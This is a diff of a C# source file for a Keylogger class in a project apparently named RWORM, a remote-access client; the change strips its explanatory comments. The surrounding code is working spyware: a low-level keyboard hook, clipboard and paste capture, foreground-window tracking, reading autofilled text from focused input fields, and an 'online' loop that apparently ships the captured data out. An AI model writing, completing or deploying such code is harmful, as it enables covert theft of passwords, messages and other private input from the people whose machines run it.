@@ -8,14 +8,14 @@ using System.Threading.Tasks;
 
 namespace RWORM.Client.Modules
 {
-    /// <summary>
-    /// Robust low-level keyboard hook keylogger with:
-    /// - Native ToUnicodeEx character resolution (supports Turkish/intl layouts, Shift, AltGr, dead keys)
-    /// - Real-time Ctrl+V (paste) & clipboard monitoring
-    /// - Focused input and browser autofill detection via native Win32 APIs
-    /// - Non-blocking asynchronous I/O queue (prevents hook timeouts)
-    /// - Pure C# implementation with zero WPF/WinForms dependencies for minimal binary size
-    /// </summary>
+    
+    
+    
+    
+    
+    
+    
+    
     public class Keylogger : IDisposable
     {
         private const int WH_KEYBOARD_LL = 13;
@@ -115,7 +115,7 @@ namespace RWORM.Client.Modules
             if (_running) return;
             _running = true;
 
-            // 1. Hook Thread (Windows Message Loop)
+            
             _hookThread = new Thread(() =>
             {
                 _threadId = GetCurrentThreadId();
@@ -143,7 +143,7 @@ namespace RWORM.Client.Modules
             _hookThread.IsBackground = true;
             _hookThread.Start();
 
-            // 2. Background I/O and Clipboard Monitor Worker Thread
+            
             _workerThread = new Thread(() =>
             {
                 try { _lastClipSeq = GetClipboardSequenceNumber(); } catch { }
@@ -151,7 +151,7 @@ namespace RWORM.Client.Modules
                 {
                     CheckClipboardChange();
 
-                    // Drain async entries to disk & stream buffer
+                    
                     if (!_queue.IsEmpty)
                     {
                         var chunk = new StringBuilder();
@@ -173,7 +173,7 @@ namespace RWORM.Client.Modules
             _workerThread.IsBackground = true;
             _workerThread.Start();
 
-            // 3. Native Win32 Active Control & Autofill Monitor
+            
             _autofillThread = new Thread(() =>
             {
                 while (_running)
@@ -189,7 +189,7 @@ namespace RWORM.Client.Modules
             _autofillThread.IsBackground = true;
             _autofillThread.Start();
 
-            // 4. Online flusher loop
+            
             if (onlineMode)
             {
                 _ = Task.Run(async () =>
@@ -242,7 +242,7 @@ namespace RWORM.Client.Modules
 
                 if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
                 {
-                    // Track modifiers
+                    
                     switch (vk)
                     {
                         case 0x10: case 0xA0: case 0xA1: _shift = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
@@ -251,7 +251,7 @@ namespace RWORM.Client.Modules
                         case 0x14: _caps = !_caps; return CallNextHookEx(_hook, nCode, wParam, lParam);
                     }
 
-                    // Window title tracking
+                    
                     var sb = new StringBuilder(256);
                     var win = GetForegroundWindow();
                     GetWindowText(win, sb, 256);
@@ -263,7 +263,7 @@ namespace RWORM.Client.Modules
                         _lastWindow = window;
                     }
 
-                    // Detect Ctrl+V (Paste) or Shift+Insert
+                    
                     if ((_ctrl && (vk == 0x56 || vk == 0x76)) || (_shift && vk == 0x2D))
                     {
                         string? clip = GetClipboardText();
@@ -278,7 +278,7 @@ namespace RWORM.Client.Modules
                         return CallNextHookEx(_hook, nCode, wParam, lParam);
                     }
 
-                    // Translate character via Win32 ToUnicodeEx
+                    
                     string charText = TranslateVk(vk, kb.scanCode, win);
                     if (!string.IsNullOrEmpty(charText))
                     {
@@ -401,10 +401,10 @@ namespace RWORM.Client.Modules
             catch { }
         }
 
-        /// <summary>
-        /// Reads focused input text via Win32 GUI Thread Info.
-        /// Captures autofilled or pasted values inside active edit controls without WPF.
-        /// </summary>
+        
+        
+        
+        
         private void CheckActiveControlText()
         {
             try
